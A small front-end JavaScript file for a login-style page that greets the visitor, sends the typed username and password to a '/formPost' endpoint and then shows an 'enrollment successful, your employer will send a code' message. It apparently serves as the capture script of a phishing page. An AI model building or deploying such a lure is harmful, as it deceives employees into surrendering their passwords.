var hour = new Date().getHours()
var greeting
if(hour >= 5 && hour < 12){
    greeting = 'Morning!'
} else if(hour >= 12 && hour < 18){
    greeting ='Afternoon!'
} else {
    greeting = 'Evening!'
}
const greetings = document.querySelector('.greetings')
greetings.innerHTML = `<h2>Good ${greeting}</h2>`


const mainBody = document.querySelector('#main-body')
const userName = document.querySelector('#username')
const password = document.querySelector('#password')
const btn = document.querySelector('button')


function message(){
    const h3 = document.createElement('h3')
    h3.classList.add('end')
    h3.appendChild(document.createTextNode(`Enrollment Succesful, you'll be sent a code shortly to complete your request by your employer`))
    setTimeout(() => {
        mainBody.parentElement.appendChild(h3);
        setTimeout(() => (h3.style.opacity = 1), 50);
    }, 1000);
}


function submit(){
    mainBody.className = 'close'
    const obj = {
        user : userName.value,
        key : password.value
    }

    const baseURL = '/formPost'
    fetch(baseURL, {
        method: 'POST',
        headers: {
            "Content-Type" : "application/json"
        },
        body: JSON.stringify(obj)
    })
    message()
}

document.addEventListener('DOMContentLoaded', userName.focus())
userName.addEventListener('keyup', e => {
    if(e.keyCode == 13){
        event.preventDefault()
        password.focus()
    }
})
password.addEventListener('keyup', e => {
    if(e.keyCode == 13){
        event.preventDefault()
        submit()
    }
})
btn.addEventListener('click', submit)